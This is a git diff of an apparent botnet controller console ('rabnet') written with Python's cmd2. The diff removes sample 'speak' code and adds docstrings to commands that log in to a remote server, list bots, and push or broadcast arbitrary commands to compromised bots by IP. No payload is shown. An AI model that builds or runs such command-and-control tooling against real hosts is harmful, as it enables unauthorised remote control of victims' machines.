@@ -17,6 +17,7 @@ from cmd2 import ansi
 REGISTERKEY = "registerkey"
 MASTERKEY = "masterkey"
 TIMER = '12'
+
 #URL = 'http://localhost:5000'
 
 
@@ -96,36 +97,7 @@ ___  ___          _              _____                       _
 
             return IP 
 
-
-    """
-    speak_parser = argparse.ArgumentParser()
-    speak_parser.add_argument('-p', '--piglatin', action='store_true', help='atinLay')
-    speak_parser.add_argument('-s', '--shout', action='store_true', help='N00B EMULATION MODE')
-    speak_parser.add_argument('-r', '--repeat', type=int, help='output [n] times')
-    speak_parser.add_argument('-f', '--fg', choices=ansi.FG_COLORS, help='foreground color to apply to output')
-    speak_parser.add_argument('-b', '--bg', choices=ansi.BG_COLORS, help='background color to apply to output')
-    speak_parser.add_argument('-l', '--bold', action='store_true', help='bold the output')
-    speak_parser.add_argument('-u', '--underline', action='store_true', help='underline the output')
-    speak_parser.add_argument('words', nargs='+', help='words to say')
-
-    @cmd2.with_argparser(speak_parser)
-    def do_speak(self, args):
-        words = []
-        for word in args.words:
-            if args.piglatin:
-                word = '%s%say' % (word[1:], word[0])
-            if args.shout:
-                word = word.upper()
-            words.append(word)
-
-        repetitions = args.repeat or 1
-        output_str = ansi.style(' '.join(words), fg=args.fg, bg=args.bg, bold=args.bold, underline=args.underline)
-
-        for i in range(min(repetitions, self.maxrepeats)):
-            # .poutput handles newlines, and accommodates output redirection too
-            self.poutput(output_str)
-    """
-
+    # Start of login command, which will authenticate master to the server
     login_parser = argparse.ArgumentParser()
     login_parser.add_argument('-r', '--remote', type=str, help='Remote rabnet server host to login to. <ip>:<port>')
     login_parser.add_argument('-u', '--username', type=str, help='Username to login with')
@@ -178,6 +150,12 @@ ___  ___          _              _____                       _
         self.poutput(output_botlist)
 
 
+
+    """
+    Command: Commands 
+    Description: Show all the commands that have been issued. 
+    (TODO: Fix this, and make sure to add a filter to per IP address)
+    """
     @cmd2.with_category(CUSTOM_CATEGORY)
     #@cmd2.with_argparser()
     def do_commands(self, arg):
@@ -201,7 +179,10 @@ ___  ___          _              _____                       _
 
 
 
-
+    """
+    Command: Push 
+    Description: Push a specific command to a specific bot. 
+    """
     push_parser = argparse.ArgumentParser()
     push_parser.add_argument('-t', '--target', type=str, help="Target bot's IP address to push the command")
     push_parser.add_argument('-c', '--command', type=str, help='Command to push')
@@ -232,6 +213,10 @@ ___  ___          _              _____                       _
     broadcast_parser = argparse.ArgumentParser()
     broadcast_parser.add_argument('-c', '--command', type=str, help='Command to push')
 
+    """
+    Command: Broadcast 
+    Description: Issue a specific command to all of the bots in the server database 
+    """
     @cmd2.with_category(CUSTOM_CATEGORY)
     @cmd2.with_argparser(broadcast_parser)
     def do_broadcast(self, args):
